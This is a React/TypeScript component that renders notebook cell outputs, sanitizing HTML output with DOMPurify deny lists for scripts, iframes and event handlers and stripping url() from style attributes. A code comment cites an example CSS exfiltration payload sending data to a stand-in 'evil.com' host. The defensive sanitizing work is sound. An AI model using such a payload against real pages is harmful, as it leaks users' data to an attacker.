import { useState, useMemo } from 'react'
import DOMPurify from 'dompurify'
import type { CellOutput } from './notebookTypes'
import AnsiRenderer from './AnsiRenderer'
import { highlightCode, escapeHtml } from '../../common/Markdown'

// Register DOMPurify hook once to strip url() from style attributes
// Prevents CSS data exfiltration (e.g., background-image: url(https://evil.com/steal?data=...))
let hookRegistered = false
if (!hookRegistered) {
  DOMPurify.addHook('uponSanitizeAttribute', (_node, data) => {
    if (data.attrName === 'style' && data.attrValue) {
      data.attrValue = data.attrValue.replace(/url\s*\([^)]*\)/gi, 'url()')
    }
  })
  hookRegistered = true
}

const PURIFY_CONFIG = {
  ALLOWED_TAGS: [
    'p', 'br', 'hr', 'div', 'span', 'pre', 'code',
    'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
    'blockquote', 'em', 'strong', 'b', 'i', 'u', 's', 'del', 'sub', 'sup',
    'ul', 'ol', 'li', 'dl', 'dt', 'dd',
    'table', 'thead', 'tbody', 'tfoot', 'tr', 'th', 'td', 'caption', 'colgroup', 'col',
    'img', 'details', 'summary', 'figure', 'figcaption',
  ],
  ALLOWED_ATTR: [
    'class', 'id', 'style', 'title', 'alt', 'src', 'width', 'height',
    'colspan', 'rowspan', 'scope', 'align', 'valign', 'border',
  ],
  ALLOW_DATA_ATTR: false,
  FORBID_TAGS: ['script', 'iframe', 'object', 'embed', 'form', 'input', 'button', 'a', 'link', 'meta', 'base'],
  FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover', 'onfocus'],
}

const TRUNCATE_LINES = 200
const TRUNCATE_SHOW = 50

function sanitizeHtml(html: string): string {
  return DOMPurify.sanitize(html, PURIFY_CONFIG) as string
}

function StreamOutput({ text, isStderr }: { text: string; isStderr: boolean }) {
  const [expanded, setExpanded] = useState(false)
  const lines = text.split('\n')
  const truncated = lines.length > TRUNCATE_LINES && !expanded

  const displayText = truncated ? lines.slice(0, TRUNCATE_SHOW).join('\n') : text

  return (
    <div className={`nb-output nb-output--stream ${isStderr ? 'nb-output--stderr' : ''}`}>
      <AnsiRenderer text={displayText} />
      {truncated && (
        <button className="nb-output__expand-btn" onClick={() => setExpanded(true)}>
          Show all {lines.length} lines
        </button>
      )}
    </div>
  )
}

function DisplayOutput({ data, metadata: _ }: { data: Record<string, string>; metadata?: Record<string, unknown> }) {
  // Check MIME types in priority order
  for (const mime of ['image/png', 'image/jpeg', 'image/gif']) {
    if (data[mime]) {
      return (
        <div className="nb-output nb-output__image">
          <img src={`data:${mime};base64,${data[mime]}`} alt="Output" />
        </div>
      )
    }
  }

  if (data['image/svg+xml']) {
    // Render SVGs via <img> data URI for full sandboxing (never inline)
    const svgData = btoa(unescape(encodeURIComponent(data['image/svg+xml'])))
    return (
      <div className="nb-output nb-output__image">
        <img src={`data:image/svg+xml;base64,${svgData}`} alt="SVG output" />
      </div>
    )
  }

  if (data['text/html']) {
    const clean = sanitizeHtml(data['text/html'])
    return (
      <div className="nb-output">
        <div className="nb-output__html" dangerouslySetInnerHTML={{ __html: clean }} />
      </div>
    )
  }

  if (data['application/json']) {
    let formatted: string
    try {
      formatted = JSON.stringify(JSON.parse(data['application/json']), null, 2)
    } catch {
      formatted = data['application/json']
    }
    const highlighted = highlightCode(formatted, 'json')
    return (
      <div className="nb-output">
        <pre className="nb-cell__source-static">
          <code dangerouslySetInnerHTML={{ __html: highlighted || escapeHtml(formatted) }} />
        </pre>
      </div>
    )
  }

  if (data['text/plain']) {
    return (
      <div className="nb-output nb-output--stream">
        <AnsiRenderer text={data['text/plain']} />
      </div>
    )
  }

  return (
    <div className="nb-output nb-output--unsupported">
      Unsupported output type: {Object.keys(data).join(', ')}
    </div>
  )
}

function ErrorOutput({ ename, evalue, traceback }: { ename: string; evalue: string; traceback: string[] }) {
  const [expanded, setExpanded] = useState(false)
  const fullTraceback = traceback.join('\n')
  const tbLines = fullTraceback.split('\n')
  const truncated = tbLines.length > 6 && !expanded
  const displayText = truncated ? tbLines.slice(0, 3).join('\n') : fullTraceback

  return (
    <div className="nb-output nb-output--error">
      <div className="nb-output--error-header">{ename}: {evalue}</div>
      {traceback.length > 0 && (
        <>
          <AnsiRenderer text={displayText} />
          {truncated && (
            <button className="nb-output__expand-btn" onClick={() => setExpanded(true)}>
              Show full traceback ({tbLines.length} lines)
            </button>
          )}
        </>
      )}
    </div>
  )
}

interface NotebookOutputProps {
  outputs: CellOutput[]
  collapsed?: boolean
  onToggleCollapse?: () => void
}

export default function NotebookOutput({ outputs, collapsed, onToggleCollapse }: NotebookOutputProps) {
  // Merge consecutive stream outputs of the same name
  const merged = useMemo(() => {
    const result: CellOutput[] = []
    for (const output of outputs) {
      const prev = result[result.length - 1]
      if (
        output.outputType === 'stream' && prev?.outputType === 'stream' &&
        output.stream === prev.stream
      ) {
        // Merge: create a new output with combined text
        result[result.length - 1] = {
          ...prev,
          text: (prev.text ?? '') + (output.text ?? ''),
        }
      } else {
        result.push(output)
      }
    }
    return result
  }, [outputs])

  if (merged.length === 0) return null

  if (collapsed) {
    return (
      <div className="nb-cell__outputs nb-output--collapsed-indicator" onClick={onToggleCollapse}>
        {'··· '}{merged.length} output{merged.length !== 1 ? 's' : ''} hidden
      </div>
    )
  }

  return (
    <div className="nb-cell__outputs">
      {merged.map((output, i) => {
        switch (output.outputType) {
          case 'stream':
            return <StreamOutput key={i} text={output.text ?? ''} isStderr={output.stream === 'stderr'} />
          case 'display_data':
          case 'execute_result':
            return <DisplayOutput key={i} data={output.data ?? {}} metadata={output.outputMetadata} />
          case 'error':
            return <ErrorOutput key={i} ename={output.ename ?? 'Error'} evalue={output.evalue ?? ''} traceback={output.traceback ?? []} />
          default:
            return null
        }
      })}
    </div>
  )
}
